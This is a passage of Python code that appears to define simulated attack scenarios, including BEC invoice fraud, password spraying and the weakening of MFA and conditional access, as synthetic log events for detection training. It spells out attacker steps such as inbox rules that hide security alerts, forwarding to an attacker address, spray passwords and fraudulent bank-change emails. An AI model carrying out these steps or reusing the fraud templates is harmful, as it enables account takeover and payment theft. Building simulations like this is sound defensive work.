        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_budget_draft", "resource_name": "FY2027 Department Budget Draft — For Review", "success": True, "description": "Attacker read confidential budget draft email", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 5: SharePoint and OneDrive browsing ---
        AttackEvent(event_type="app_event", delay=_delay(20, 10, 5, 60), data={"app": "SharePoint Online", "action": "navigate", "resource_type": "site", "resource_name": "https://company.sharepoint.com/sites/Finance", "success": True, "description": "Attacker browsed Finance SharePoint site", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(8, 4, 2, 20), data={"action": "download", "path": "https://company.sharepoint.com/sites/Finance/Shared Documents/Q4-Revenue-Forecast.xlsx", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Downloaded Q4 revenue forecast from Finance SharePoint", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "OneDrive", "action": "navigate", "resource_type": "folder", "resource_name": "OneDrive — Personal/Documents", "success": True, "description": "Attacker browsed victim's OneDrive personal documents", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "download", "path": "https://company-my.sharepoint.com/personal/Documents/Passwords-and-Accounts.xlsx", "system": "onedrive", "label": "personal", "category": "credentials", "description": "Downloaded file named 'Passwords-and-Accounts' from OneDrive", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 6: Persistence — mail forwarding rule ---
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 40), data={"app": "Exchange Online", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_forward", "resource_name": "Auto-Forward to External", "success": True, "description": "Mailbox forwarding rule created to external address for persistent email access", "metadata": {"attack_phase": "persistence", "is_attacker": True, "external_forwarding": True}}, requires_success=True),

        # --- Phase 7: Network indicator ---
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 12), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 2097152, "bytes_received": 8388608, "description": "Sustained HTTPS session to M365 from foreign IP — mailbox, SharePoint, and OneDrive access"}, requires_success=True),
    ],
    parameters=SHARED_DOCUMENT_LURE_PARAMS,
    success_rate=0.65,
    iocs=["onedrive-sharelink.com", "sharepoint-external-share.net"],
    expected_findings=[
        "Phishing email mimicking OneDrive/SharePoint document sharing notification",
        "Credentials submitted to fake sign-in page on external domain",
        "Attacker login from foreign IP ~1 hour after credential capture",
        "Mail forwarding rule to external address created for persistent email access",
    ],
    relevant_ioc_keys=["attacker_email", "phishing_domain", "phishing_url", "attacker_ip"],
)


BEC_INVOICE_DIVERSION_PARAMS = {
    "attacker_domains": ["noreply.com"], "sender_names": ["System"], "sender_prefixes": ["noreply"],
    "financial_search_terms": ["invoice", "wire transfer", "ACH payment", "vendor payment", "bank account"],
    "inbox_rules": ["Move items matching 'payment confirmation' to Deleted Items", "Delete messages with subject containing 'fraud'"],
    "fraudulent_invoice_subjects": ["Updated Banking Details — Please Update Records", "Invoice: Updated Remittance Instructions"],
    "fraudulent_invoice_bodies": ["Please be advised that our banking details have changed. All future payments should be directed to the new account.\n\nBank: Coastal Business Bank\nAccount: 4827391056\n\nBest regards"],
    "attacker_geos": SHARED_ATTACKER_INFRA["attacker_geos"],
    "attacker_ip_ranges": SHARED_ATTACKER_INFRA["c2_ips"],
    "attacker_user_agents": SHARED_ATTACKER_INFRA["attacker_user_agents"],
}

BEC_INVOICE_DIVERSION = AttackScenario(
    id="bec_invoice_diversion",
    tier="T3",
    name="BEC Invoice Diversion — Payment Redirection Fraud",
    description="Attacker compromises a finance team member's mailbox and spends days silently studying vendor payment workflows, invoice cadences, and approval chains. After identifying an upcoming payment cycle, the attacker sets up inbox rules to intercept and hide vendor replies, creates external forwarding for ongoing monitoring, then sends a fraudulent payment redirection email impersonating the vendor. Returns post-strike to monitor whether the payment was diverted and cleans up traces.",
    attack_type="bec",
    events=[
        # =====================================================================
        # DAY 1 — Initial compromise + first mailbox reconnaissance
        # =====================================================================

        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: First recon — understand mailbox and search for financial keywords ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "access_mailbox", "resource_type": "mailbox", "resource_name": "Inbox", "success": True, "description": "Attacker accessed mailbox via OWA", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'invoice OR wire transfer OR ACH payment'", "success": True, "description": "Attacker searched mailbox for payment-related keywords", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'vendor payment OR bank account OR remittance'", "success": True, "description": "Attacker searched mailbox for banking and remittance terms", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_acme_invoice_oct", "resource_name": "Invoice #4821 — Acme Corp October Services", "success": True, "description": "Attacker read Acme Corp invoice email from last month", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_ap_process", "resource_name": "Re: AP Payment Schedule — Q4 Vendor Payments", "success": True, "description": "Attacker read accounts payable payment schedule thread", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 3 — Return + deep recon: study specific vendor and payment cycle
        # (2-day gap: attacker reviews what they found, identifies target vendor)
        # =====================================================================

        # --- Phase 3: Attacker returns to study target vendor ---
        AttackEvent(event_type="login", delay=_delay(2880, 720, 1440, 4320), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True, "return_session": True}}, requires_success=False),

        # --- Phase 4: Deep recon — vendor correspondence and approval workflow ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'Acme Corp'", "success": True, "description": "Attacker searched for all Acme Corp correspondence", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_acme_banking", "resource_name": "Re: Acme Corp — Updated Banking Details for FY2026", "success": True, "description": "Attacker read email containing Acme Corp current banking details", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True, "banking_details_viewed": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_acme_nov_invoice", "resource_name": "Invoice #4903 — Acme Corp November Services (Due: Dec 15)", "success": True, "description": "Attacker found upcoming Acme Corp invoice due next week", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True, "payment_target_identified": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_approval_chain", "resource_name": "Re: Payment Approval — Acme Corp Invoice #4903", "success": True, "description": "Attacker studied internal approval chain for vendor payments", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_acme_contact", "resource_name": "Acme Corp — Point of Contact Update", "success": True, "description": "Attacker identified Acme Corp billing contact name and email format", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 5 — Return + defense evasion + persistence setup
        # (2-day gap: attacker prepares inbox rules before strike)
        # =====================================================================

        # --- Phase 5: Attacker returns to set traps ---
        AttackEvent(event_type="login", delay=_delay(2880, 720, 1440, 4320), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True, "return_session": True}}, requires_success=False),

        # --- Phase 6: Inbox rules — hide security alerts and intercept vendor replies ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_hide_alerts", "resource_name": "Auto-Delete Security Alerts", "success": True, "description": "Inbox rule created to auto-delete emails containing 'unusual sign-in' or 'security alert'", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Outlook Web Access", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_intercept_vendor", "resource_name": "Move Acme Replies to RSS Feeds", "success": True, "description": "Inbox rule created to redirect emails from Acme Corp to RSS Feeds folder — hides real vendor replies", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Outlook Web Access", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_hide_payment_conf", "resource_name": "Delete Payment Confirmation Replies", "success": True, "description": "Inbox rule to auto-delete emails containing 'payment confirmation' or 'fraud'", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 7: External forwarding for ongoing monitoring ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Exchange Online", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_forward", "resource_name": "Auto-Forward to External", "success": True, "description": "Mailbox forwarding rule created to attacker-drop@protonmail.com", "metadata": {"attack_phase": "persistence", "is_attacker": True, "external_forwarding": True}}, requires_success=True),

        # =====================================================================
        # DAY 7 — Strike: send fraudulent invoice email
        # (2-day gap: timing aligned with payment due date)
        # =====================================================================

        # --- Phase 8: Attacker returns to send the fraudulent email ---
        AttackEvent(event_type="login", delay=_delay(2880, 720, 1440, 4320), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "action_on_objectives", "is_attacker": True, "return_session": True}}, requires_success=False),

        # --- Phase 9: Send fraudulent payment redirection email ---
        AttackEvent(event_type="email", delay=_delay(15, 8, 3, 45), data={"direction": "sent", "subject": "{fraudulent_invoice_subject}", "content": "{fraudulent_invoice_body}", "external": False, "metadata": {"is_malicious": True, "attack_phase": "action_on_objectives", "is_attacker": True, "bec_fraud_email": True}}, requires_success=True),
        # Follow-up email pressing urgency
        AttackEvent(event_type="email", delay=_delay(45, 20, 10, 120), data={"direction": "sent", "subject": "Re: Updated Banking Details — Time-Sensitive", "content": "Hi team, just flagging this again — Acme Corp's payment is due by end of week and their bank details have changed. Please update the records before processing.\n\nThanks", "external": False, "metadata": {"is_malicious": True, "attack_phase": "action_on_objectives", "is_attacker": True, "bec_followup": True}}, requires_success=True),
        # Attacker checks for replies
        AttackEvent(event_type="app_event", delay=_delay(30, 15, 5, 90), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Sent Items Search: 'payment confirmation OR bank details updated'", "success": True, "description": "Attacker checked sent/inbox for responses to fraudulent email", "metadata": {"attack_phase": "action_on_objectives", "is_attacker": True}}, requires_success=True),
        # Delete the fraudulent email from Sent Items
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "delete_email", "resource_type": "email", "resource_id": "msg_fraudulent_sent", "resource_name": "Updated Banking Details — Please Update Records", "success": True, "description": "Attacker deleted fraudulent email from Sent Items folder", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 9 — Post-strike: monitor outcome + cleanup
        # (2-day gap: waiting for payment to be processed)
        # =====================================================================

        # --- Phase 10: Attacker returns to check results ---
        AttackEvent(event_type="login", delay=_delay(2880, 720, 1440, 4320), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "post_strike", "is_attacker": True, "return_session": True}}, requires_success=False),

        # --- Phase 11: Check payment status and clean up ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'payment processed OR wire confirmation OR transfer complete'", "success": True, "description": "Attacker searched for payment confirmation", "metadata": {"attack_phase": "post_strike", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_payment_conf", "resource_name": "Re: Acme Corp Payment — Wire Transfer Processed", "success": True, "description": "Attacker confirmed wire transfer was processed to fraudulent account", "metadata": {"attack_phase": "post_strike", "is_attacker": True, "payment_diverted": True}}, requires_success=True),
        # Remove inbox rules to reduce forensic evidence
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "Outlook Web Access", "action": "delete_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_intercept_vendor", "resource_name": "Move Acme Replies to RSS Feeds", "success": True, "description": "Attacker deleted vendor interception rule to cover tracks", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True, "cleanup": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Outlook Web Access", "action": "delete_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_hide_payment_conf", "resource_name": "Delete Payment Confirmation Replies", "success": True, "description": "Attacker deleted payment confirmation hiding rule", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True, "cleanup": True}}, requires_success=True),
    ],
    parameters=BEC_INVOICE_DIVERSION_PARAMS,
    success_rate=0.45,
    iocs=["Inbox rule hiding payment-related replies", "External forwarding configured"],
    expected_findings=[
        "Repeated logins from same foreign IP over ~9 days — persistent mailbox access",
        "Specific vendor targeted after recon — banking details and invoice schedule studied",
        "Inbox rules created for vendor reply interception and payment confirmation hiding",
        "Fraudulent payment redirection email sent followed by urgency follow-up",
    ],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)


PASSWORD_SPRAYING_PARAMS = {
    "attacker_domains": ["noreply.com"], "sender_names": ["System"], "sender_prefixes": ["noreply"],
    "spray_passwords": ["Spring2025!", "Welcome1!", "Password1", "Company2025", "Monday123!"],
    "failure_reasons": ["invalid_password", "invalid_password", "invalid_password", "account_not_found"],
    "attacker_geos": SHARED_ATTACKER_INFRA["attacker_geos"],
    "attacker_ip_ranges": SHARED_ATTACKER_INFRA["c2_ips"],
    "attacker_user_agents": SHARED_ATTACKER_INFRA["attacker_user_agents"],
}

PASSWORD_SPRAYING = AttackScenario(
    id="password_spraying",
    tier="T2",
    name="Password Spraying — Low-and-Slow Credential Attack",
    description="Attacker tries common passwords across many accounts to avoid lockouts. Burst of failed logins (including against other users) precedes a single success. After gaining access, attacker browses mailbox, exports contacts for further targeting, and generates suspicious network traffic from the foreign IP.",
    attack_type="account_takeover",
    events=[
        # --- Phase 1: Spray attempts against other users (visible as pre_attempts on victim) ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True, "password_spray": True}}, requires_success=False, pre_attempts={"count_range": [8, 25], "delay": _delay(2, 1, 0.5, 8), "data_overrides": {"success": False, "failure_reason": "invalid_password", "metadata": {"attack_phase": "credential_access", "is_attacker": True, "spray_attempt": True}}}),

        # --- Phase 2: Mailbox browsing ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 15), data={"app": "Outlook Web Access", "action": "access_mailbox", "resource_name": "Inbox", "success": True, "description": "Attacker accessed inbox after spray success", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: Search mailbox for high-value content ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 25), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'password OR VPN OR credentials OR MFA'", "success": True, "description": "Attacker searched mailbox for credential-related keywords", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 4: Browse specific folders ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook Web Access", "action": "access_mailbox", "resource_name": "Sent Items", "success": True, "description": "Attacker browsed Sent Items folder looking for internal communications", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 5: Export contacts for further spray/phishing ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "Outlook Web Access", "action": "export_contacts", "resource_type": "contacts", "resource_name": "Global Address List Export", "success": True, "description": "Attacker exported contact list for further targeting", "metadata": {"attack_phase": "collection", "is_attacker": True, "contact_harvesting": True}}, requires_success=True),

        # --- Phase 6: Read sensitive emails ---
        AttackEvent(event_type="app_event", delay=_delay(4, 3, 1, 12), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "Re: VPN Setup Instructions for Remote Staff", "success": True, "description": "Attacker read email containing VPN access instructions", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "FW: Admin Portal Access — Service Account Credentials", "success": True, "description": "Attacker read email containing service account credentials", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 7: Browse OneDrive for additional data ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "OneDrive for Business", "action": "browse_folder", "usage": "read", "resource_name": "Shared With Me", "success": True, "description": "Attacker browsed files shared with victim on OneDrive", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/onedrive/Shared/IT_Infrastructure_Diagram.vsdx", "system": "onedrive", "label": "internal", "category": "infrastructure", "description": "Downloaded IT infrastructure diagram from OneDrive", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 8: Persistence — inbox forwarding rule ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "Exchange Online", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_forward", "resource_name": "Auto-Forward to External", "success": True, "description": "Inbox forwarding rule created to external address for ongoing email monitoring", "metadata": {"attack_phase": "persistence", "is_attacker": True, "external_forwarding": True}}, requires_success=True),

        # --- Phase 9: Network indicator — attacker session from foreign IP ---
        AttackEvent(event_type="network_event", delay=_delay(2, 1, 0.5, 8), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 131072, "bytes_received": 524288, "description": "Sustained HTTPS session to Exchange Online from spray source IP"}, requires_success=True),
    ],
    parameters=PASSWORD_SPRAYING_PARAMS,
    success_rate=0.45,
    iocs=["185.234.72.", "91.134.128."],
    expected_findings=["Multiple failed logins from single IP across accounts", "Single successful login after spray failures", "Login from unknown device and foreign IP", "Inbox forwarding rule to external address"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)


# =============================================================================
# IDENTITY PERSISTENCE SCENARIOS
# =============================================================================

_IDENTITY_BASE_PARAMS = {
    "attacker_domains": ["noreply.com"], "sender_names": ["System"], "sender_prefixes": ["noreply"],
    "attacker_geos": SHARED_ATTACKER_INFRA["attacker_geos"],
    "attacker_ip_ranges": SHARED_ATTACKER_INFRA["c2_ips"],
    "attacker_user_agents": SHARED_ATTACKER_INFRA["attacker_user_agents"],
}

NEW_MFA_REGISTRATION = AttackScenario(
    id="new_mfa_registration",
    tier="T1",
    name="New MFA Device Registration for Persistence",
    description="After compromise, attacker enrolls new MFA method/device to maintain access even after password reset. Attacker re-authenticates with the new MFA, browses the Azure portal, and accesses the victim's mailbox to search for sensitive content.",
    attack_type="account_takeover",
    events=[
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        AttackEvent(event_type="mfa_event", delay=_delay(5, 3, 1, 20), data={"action": "device_registered", "method": "Authenticator App", "device_name": "Unknown Device", "success": True, "metadata": {"attack_phase": "persistence", "is_attacker_device": True}}, requires_success=True),
        AttackEvent(event_type="login", delay=_delay(30, 20, 5, 120), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "SSO+MFA", "metadata": {"attack_phase": "persistent_access", "is_attacker": True, "using_attacker_mfa": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 15), data={"app": "Azure Portal", "action": "access", "success": True, "description": "Accessed sensitive app after MFA persistence", "metadata": {"attack_phase": "objectives", "is_attacker": True}}, requires_success=True),

        # --- Phase 5: Mailbox access after persistent login ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 25), data={"app": "Outlook Web Access", "action": "access_mailbox", "resource_name": "Inbox", "success": True, "description": "Attacker accessed mailbox after establishing persistent MFA", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 6: Search mailbox for sensitive content ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'password reset OR admin credentials OR VPN'", "success": True, "description": "Attacker searched mailbox for credential-related keywords", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
    ],
    parameters=_IDENTITY_BASE_PARAMS,
    success_rate=0.8,
    iocs=[],
    expected_findings=["Login from foreign IP", "New MFA device enrolled after suspicious login", "Mailbox accessed after persistent login"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

MFA_CONDITIONAL_ACCESS_WEAKENING = AttackScenario(
    id="mfa_conditional_access_weakening",
    tier="T3",
    name="MFA and Conditional Access Policy Weakening",
    description="Attacker with compromised admin credentials performs multi-day Conditional Access weakening campaign. Day 1: logs in, enumerates all CA policies, named locations, and sign-in logs to understand the security posture, then performs staged weakening — adds a trusted location, excludes it from MFA, widens MFA exemptions, and verifies changes took effect. Day 2-3: returns and exploits the weakened policy to log in without MFA, accesses admin portal, browses SharePoint and OneDrive, downloads sensitive files, accesses mailboxes, creates forwarding rules, and exfiltrates data.",
    attack_type="account_takeover",
    events=[
        # =====================================================================
        # DAY 1 — Initial access + reconnaissance + staged CA weakening
        # =====================================================================

        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "SSO+MFA", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Comprehensive policy enumeration ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Azure AD Conditional Access", "action": "list_policies", "resource_name": "All Conditional Access Policies", "success": True, "description": "Enumerated all Conditional Access policies in tenant", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure AD Conditional Access", "action": "get_policy_details", "resource_name": "Require MFA for All Users", "success": True, "description": "Retrieved detailed configuration of primary MFA policy — conditions, exclusions, grant controls", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Azure AD Conditional Access", "action": "list_named_locations", "resource_name": "Named Locations", "success": True, "description": "Listed all named/trusted locations to identify bypass opportunity", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Azure AD", "action": "list_sign_in_logs", "resource_name": "Sign-in Logs — Last 7 Days", "success": True, "description": "Reviewed sign-in logs to understand normal MFA patterns and identify service accounts exempt from MFA", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure AD Conditional Access", "action": "get_policy_details", "resource_name": "Block Legacy Authentication", "success": True, "description": "Reviewed legacy auth blocking policy for potential bypass vectors", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: Staged weakening — add trusted location ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Azure AD Conditional Access", "action": "create_named_location", "resource_name": "Regional Office - Satellite", "success": True, "description": "Created named location with attacker IP range disguised as regional office", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True, "trusted_location_added": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "Azure AD Conditional Access", "action": "policy_modify", "resource_name": "Require MFA for All Users", "success": True, "description": "CA policy modified to exclude new trusted location from MFA requirement", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True, "policy_weakened": True}}, requires_success=True),

        # --- Phase 4: Widen MFA exemptions ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Azure AD Conditional Access", "action": "policy_modify", "resource_name": "MFA Enforcement Policy", "success": True, "description": "MFA enforcement disabled for service accounts scope — attacker widens exemption", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 5: Verify changes took effect ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "Azure AD Conditional Access", "action": "get_policy_details", "resource_name": "Require MFA for All Users — Post-Modification", "success": True, "description": "Re-read MFA policy to verify trusted location exclusion is active", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 2-3 — Return + exploit weakened policy + data collection + exfil
        # =====================================================================

        # --- Phase 6: Multi-day waiting period — return with weakened policy ---
        AttackEvent(event_type="login", delay=_delay(2880, 720, 1440, 4320), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "persistent_access", "is_attacker": True, "mfa_bypassed_via_policy": True, "return_session": True}}, requires_success=True),

        # --- Phase 7: Access admin portal ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Microsoft 365 Admin Center", "action": "access", "success": True, "description": "Accessed admin portal without MFA using weakened CA policy", "metadata": {"attack_phase": "objectives", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Microsoft 365 Admin Center", "action": "enumerate", "resource_name": "All Users and Roles", "success": True, "description": "Enumerated all tenant users and their role assignments", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 8: Mailbox access and search ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "access_mailbox", "resource_type": "mailbox", "resource_name": "CEO Mailbox", "success": True, "description": "Accessed CEO mailbox via admin privileges with MFA-free session", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "CEO Mailbox Search: 'acquisition OR merger OR board approval'", "success": True, "description": "Searched CEO mailbox for M&A and board-related keywords", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
